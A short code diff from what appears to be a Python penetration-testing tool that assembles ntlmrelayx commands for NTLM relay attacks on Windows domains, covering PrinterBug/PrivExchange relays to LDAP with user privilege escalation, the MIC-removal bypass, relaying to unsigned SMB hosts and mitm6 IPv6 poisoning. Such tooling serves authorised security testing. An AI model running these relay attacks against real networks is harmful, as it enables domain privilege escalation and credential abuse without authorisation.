@@ -17,19 +17,20 @@ def create_ntlmrelayx_cmd(args):
     # PrinterBug/PrivExchange
     if args.user:
         dom, user, pw = parse_creds(args)
-        target = f' -t ldap://{args.domain_controller}'
-        relay_cmd = relay_cmd + f" --remove-mic --escalate-user {user}" + target
-        return relay_cmd
+        relay_cmd += f' --escalate-user {user} -t ldap://{args.domain_controller}'
+        # PrinterBug
+        if not args.privexchange:
+            relay_cmd += ' --remove-mic'
 
-    # Normal usage
+    # Relay
     else:
         target = f' -tf '
         if args.target_file:
             target += args.target_file
-        else:
+        elif args.hostlist:
             target += 'unsigned-smb-hosts.txt'
 
-    relay_cmd = relay_cmd + target
+        relay_cmd += target
 
     if args.mitm6:
         six_poison = ' -6 -wh NetProxy-Service -wa 2'
